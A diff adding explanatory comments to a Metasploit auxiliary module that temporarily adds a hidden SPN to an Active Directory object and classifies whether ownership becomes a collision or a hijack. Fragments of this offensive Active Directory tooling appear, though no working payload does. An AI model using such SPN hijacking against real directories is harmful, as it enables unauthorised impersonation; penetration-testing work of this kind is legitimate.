@@ -151,6 +151,7 @@ class MetasploitModule < Msf::Auxiliary
     if target_spns(@target_dn).include?(hidden_spn)
       fail_with(Failure::BadConfig, "The target already contains #{visible_value(hidden_spn)}; refusing to modify or roll back a pre-existing value.")
     end
+    # Record the clean SPN's current owners before modifying any SPNs.
     before = spn_owners(clean_spn)
 
     print_status("Adding #{visible_value(hidden_spn)} to #{@target_dn}")
@@ -242,6 +243,9 @@ class MetasploitModule < Msf::Auxiliary
     canonical_dn(left) == canonical_dn(right)
   end
 
+  # Return :ineffective if the target already owned the SPN or remains absent,
+  # :collision if it shares ownership after the change, or :hijack if it becomes
+  # the sole owner.
   def classify_resolution(owners_before, owners_after, target_object_dn)
     normalized_target_dn = canonical_dn(target_object_dn)
     normalized_before = owners_before.map { |owner| canonical_dn(owner) }.uniq
@@ -262,6 +266,9 @@ class MetasploitModule < Msf::Auxiliary
     false
   end
 
+  # Add the SPN for the duration of the block, removing it afterward if added.
+  # Preserve an active exception if cleanup also fails; otherwise propagate
+  # the cleanup failure.
   def with_temporary_spn(object_dn, spn)
     added = false
     add_spn(object_dn, spn)
